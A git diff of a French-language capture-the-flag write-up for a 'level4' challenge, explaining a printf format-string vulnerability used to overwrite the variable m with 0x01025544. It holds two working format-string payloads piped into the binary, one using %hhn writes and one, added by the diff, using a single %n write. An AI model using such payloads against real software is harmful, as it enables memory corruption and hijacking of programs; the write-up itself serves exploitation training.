@@ -6,7 +6,7 @@ Comme pour le precedent level, la faille reside dans l'utilisation de printf ave
 
 ## La solution
 > adresse de m: 0x08049810 \
-> index de l'argument qui debute au buffer: 9
+> index de l'argument qui debute au buffer: 12
 
 Il faut que m ait la valeur 0x01025544. Cette valeur est trop grande pour l'ecrire d'un seul coup a l'aide du printf dans le buffer.
 Il faudra donc la diviser en plusieurs morceaux, du plus petit au plus grand:
@@ -60,4 +60,13 @@ Par ailleurs, le programme test.c verifie que notre chaine ecrit bien la valeur 
 ```
 $> printf "a%%41\$hhnb%%42\$hhnAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1%%44\$hhnAa0Aa1Aa2Aa3Aa4Aa%%43\$hhnabc\x13\x98\x04\x08\x12\x98\x04\x08\x11\x98\x04\x08\x10\x98\x04\x08\n" > /tmp/level4.txt
 $> cat /tmp/level4.txt - | ./level4
+```
+
+Une autre solution consisterait à écrire 16930116 caractères - 4 pour la taille de l'adresse de m.
+
+```
+Solution bis
+
+(python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112c%12$n"'; cat) | ./level4
+
 ```
